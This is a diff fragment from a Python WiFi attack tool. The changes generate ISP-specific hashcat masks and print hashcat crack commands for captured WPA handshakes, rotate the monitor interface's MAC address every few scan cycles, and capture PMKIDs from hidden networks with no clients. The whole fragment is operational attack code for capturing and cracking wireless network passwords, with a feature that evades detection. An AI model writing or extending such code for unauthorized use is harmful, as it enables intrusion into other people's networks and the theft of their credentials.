-                logging.info("Generated ISP masks for %s: %s (%s, %d masks)", essid, hcmask_path, isp or "", len(masks))
-                # Estimator: if any mask > 48h at ~300 kH/s, warn
-                for entry in masks:
-                    ks = _mask_keyspace(entry["mask"])
-                    hours = _estimate_mask_time_hours(ks)
-                    if hours > 48:
-                        logging.warning(
-                            "  Mask %s: keyspace ~%.2e, estimated > %.0f h at 300 kH/s -> infeasible without --runtime or specific context.",
-                            entry["mask"], float(ks), hours,
-                        )
+                written, skipped = write_hcmask(str(hcmask_path), masks, max_hours=48.0, speed_hps=speed_hps)
                 logging.info(
-                    "  Hashcat (mask ISP): hashcat -m 22000 %s -a 3 %s -O -w 4 --status",
+                    "Generated ISP masks for %s: %s (%s, %d written%s)",
+                    essid, hcmask_path, isp or "", written,
+                    f", {skipped} skipped (>48h)" if skipped else "",
+                )
+                logging.info(
+                    "  Hashcat (mask -a 3): hashcat -m 22000 %s -a 3 %s -O -w 4 --status",
                     handshake_placeholder, hcmask_path.resolve(),
                 )
-                logging.info("  For heavy masks: add --runtime=1800 to avoid running indefinitely.")
+                if hybrid_bases:
+                    bases_path = out_dir / f"{safe_name}_isp_bases.txt"
+                    bases_path.write_text("\n".join(hybrid_bases) + "\n", encoding="utf-8")
+                    logging.info("  Hybrid bases for -a 6: %s (%d words)", bases_path.resolve(), len(hybrid_bases))
+                    example_mask = next((m["mask"] for m in sorted(masks, key=lambda x: x["priority"]) if _estimate_mask_time_hours(_mask_keyspace(m["mask"]), speed_hps) <= 48), None)
+                    if example_mask:
+                        logging.info(
+                            '  Hashcat (hybrid -a 6): hashcat -m 22000 %s -a 6 %s "%s" -O -w 4 --status',
+                            handshake_placeholder, bases_path.resolve(), example_mask,
+                        )
+                logging.info("  For long runs: add --runtime=1800 to avoid running indefinitely.")
         conn.close()
         if not seen:
             logging.warning("No captured ESSIDs in DB; no wordlists generated.")
@@ -987,6 +1373,14 @@ def main() -> int:
         return 1
 
     scan_temp_dir = Path(tempfile.mkdtemp(prefix="wifi_handshake_scan_"))
+
+    # Save NetworkManager state so we can restore only if it was active
+    nm_was_active = False
+    try:
+        code, out, _ = run_cmd(["systemctl", "is-active", "NetworkManager"], timeout=5)
+        nm_was_active = code == 0 and (out or "").strip().lower() == "active"
+    except Exception:
+        pass
 
     logging.info("Data path: %s | Handshakes: %s | DB: %s", base_path, handshakes_dir, db_path)
 
@@ -1107,6 +1501,8 @@ def main() -> int:
         while True:
             cycle += 1
             stats["cycles"] = cycle
+            if getattr(args, "mac_rotate", 0) and args.mac_rotate > 0 and (cycle % args.mac_rotate == 0):
+                rotate_mac(mon_iface)
             logging.info("=== Cycle %d ===", cycle)
             networks = get_networks_with_clients(
                 mon_iface, args.time, scan_temp_dir, skip_bssids, skip_essids, current_proc_holder, args.channel
@@ -1143,6 +1539,29 @@ def main() -> int:
 
                 if essid == "hidden_network":
                     stats["hidden_detected"] += 1
+                    if not clients:
+                        # No clients: try PMKID capture (no deauth, no client needed)
+                        pmkid_path = try_capture_pmkid(
+                            mon_iface, bssid, channel, handshakes_dir,
+                            timeout_sec=min(45, getattr(args, "hidden_wait", 25)),
+                            current_proc_holder=current_proc_holder,
+                        )
+                        if pmkid_path is not None:
+                            conn.execute(
+                                "INSERT OR REPLACE INTO captured (bssid, essid, handshake_path, created_at) VALUES (?,?,?,?)",
+                                (bssid, "PMKID", str(pmkid_path), time.strftime("%Y-%m-%d %H:%M:%S")),
+                            )
+                            conn.commit()
+                            reload_skip_list()
+                            stats["success"] += 1
+                            stats["attempted"] += 1
+                            logging.info("PMKID captured for %s (no client): %s", bssid, pmkid_path)
+                        else:
+                            stats["skipped"] += 1
+                            logging.debug("No clients for hidden %s; PMKID capture failed or skipped", bssid)
+                        if args.ap_delay and args.ap_delay > 0:
+                            time.sleep(args.ap_delay)
+                        continue
                     logging.info("Hidden network detected: BSSID %s. Attempting ESSID recovery...", bssid)
                     cached = discovered_essids.get(bssid.lower())
                     if cached:
@@ -1154,6 +1573,7 @@ def main() -> int:
                             mon_iface, bssid, channel, clients,
                             scan_temp_dir, current_proc_holder,
                             timeout_sec=args.hidden_wait,
+                            passive_secs=args.hidden_passive,
                         )
                         if revealed:
                             essid = revealed
@@ -1266,6 +1686,9 @@ def main() -> int:
             stats_thread.join(timeout=2)
         logging.info("Final statistics: %s", format_stats())
         set_managed_mode(mon_iface)
+        if nm_was_active:
+            logging.info("Restoring NetworkManager...")
+            run_cmd(["systemctl", "start", "NetworkManager"], timeout=10)
         try:
             verify_stored_handshakes(conn, handshakes_dir)
         except Exception as e:
